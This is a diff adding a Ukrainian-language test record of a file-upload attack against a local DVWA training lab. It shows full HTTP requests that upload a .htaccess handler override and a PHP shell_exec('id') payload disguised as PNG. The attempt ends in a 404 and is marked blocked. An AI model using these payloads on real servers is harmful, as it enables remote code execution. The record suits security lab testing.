@@ -1,0 +1,145 @@
+# V7. .htaccess у каталозі завантажень змінює обробник → RCE
+
+Рівень безпеки DVWA: medium
+
+Результат: заблоковано (HTTP 404)
+
+
+
+### Завантаження .htaccess
+>>> POST http://127.0.0.1:8081/vulnerabilities/upload/
+>>> Content-Type: multipart/form-data; boundary=4283cb10acc8e0b0dae0572e735f509f
+>>> Cookie: security=medium; PHPSESSID=5580aad035c4084d8eeebe7381f48011
+>>>
+--4283cb10acc8e0b0dae0572e735f509f
+Content-Disposition: form-data; name="Upload"
+
+Upload
+--4283cb10acc8e0b0dae0572e735f509f
+Content-Disposition: form-data; name="MAX_FILE_SIZE"
+
+100000
+--4283cb10acc8e0b0dae0572e735f509f
+Content-Disposition: form-data; name="uploaded"; filename=".htaccess"
+Content-Type: image/png
+
+<FilesMatch "\.rgrc27a$">
+  SetHandler application/x-httpd-php
+</FilesMatch>
+
+--4283cb10acc8e0b0dae0572e735f509f--
+
+<<< HTTP 200 OK
+<<< Content-Type: text/html;charset=utf-8
+<<< Content-Length: 1573
+<<< (фрагмент тіла; HTML-теги прибрано для читабельності)
+
+		Vulnerability: File Upload :: Damn Vulnerable Web Application (DVWA)
+				Home
+Instructions
+Setup / Reset DB
+Brute Force
+Command Injection
+CSRF
+File Inclusion
+File Upload
+Insecure CAPTCHA
+SQL Injection
+SQL Injection (Blind)
+Weak Session IDs
+XSS (DOM)
+XSS (Reflected)
+XSS (Stored)
+CSP Bypass
+JavaScript Attacks
+Authorisation Bypass
+Open HTTP Redirect
+Cryptography
+API
+DVWA Security
+PHP Info
+About
+Logout
+	Vulnerability: File Upload
+			Choose an image to upload:
+		Зображення не завантажено. Дозволено лише JPEG або PNG до 100 КБ.
+	More Information
+		https://owasp.org/www-community/vulnerabilities/Unrestricted_File_Upload
+		https://www.acunetix.com/websitesecurity/upload-forms-threat/
+				  Username: adminSecurity Level: mediumLocale: enSQLi DB: mysql
+				Damn Vulnerable Web Application (DVWA)
+
+
+### Завантаження файлу .rgrc27a
+>>> POST http://127.0.0.1:8081/vulnerabilities/upload/
+>>> Content-Type: multipart/form-data; boundary=6ab0d83068e0439f78dc9700616cc0b6
+>>> Cookie: security=medium; PHPSESSID=5580aad035c4084d8eeebe7381f48011
+>>>
+--6ab0d83068e0439f78dc9700616cc0b6
+Content-Disposition: form-data; name="Upload"
+
+Upload
+--6ab0d83068e0439f78dc9700616cc0b6
+Content-Disposition: form-data; name="MAX_FILE_SIZE"
+
+100000
+--6ab0d83068e0439f78dc9700616cc0b6
+Content-Disposition: form-data; name="uploaded"; filename="rgr_v7.rgrc27a"
+Content-Type: image/png
+
+<?php echo "RGR-V8-" . (7*191) . " id: " . trim((string) shell_exec("id")); ?>
+--6ab0d83068e0439f78dc9700616cc0b6--
+
+<<< HTTP 200 OK
+<<< Content-Type: text/html;charset=utf-8
+<<< Content-Length: 1573
+<<< (фрагмент тіла; HTML-теги прибрано для читабельності)
+
+		Vulnerability: File Upload :: Damn Vulnerable Web Application (DVWA)
+				Home
+Instructions
+Setup / Reset DB
+Brute Force
+Command Injection
+CSRF
+File Inclusion
+File Upload
+Insecure CAPTCHA
+SQL Injection
+SQL Injection (Blind)
+Weak Session IDs
+XSS (DOM)
+XSS (Reflected)
+XSS (Stored)
+CSP Bypass
+JavaScript Attacks
+Authorisation Bypass
+Open HTTP Redirect
+Cryptography
+API
+DVWA Security
+PHP Info
+About
+Logout
+	Vulnerability: File Upload
+			Choose an image to upload:
+		Зображення не завантажено. Дозволено лише JPEG або PNG до 100 КБ.
+	More Information
+		https://owasp.org/www-community/vulnerabilities/Unrestricted_File_Upload
+		https://www.acunetix.com/websitesecurity/upload-forms-threat/
+				  Username: adminSecurity Level: mediumLocale: enSQLi DB: mysql
+				Damn Vulnerable Web Application (DVWA)
+
+
+### Виконання
+>>> GET http://127.0.0.1:8081/hackable/uploads/rgr_v7.rgrc27a
+>>> Cookie: security=medium; PHPSESSID=5580aad035c4084d8eeebe7381f48011
+<<< HTTP 404 Not Found
+<<< Content-Type: text/html; charset=iso-8859-1
+<<< Content-Length: 236
+<<< (фрагмент тіла; HTML-теги прибрано для читабельності)
+
+404 Not Found
+Not Found
+The requested URL was not found on this server.
+
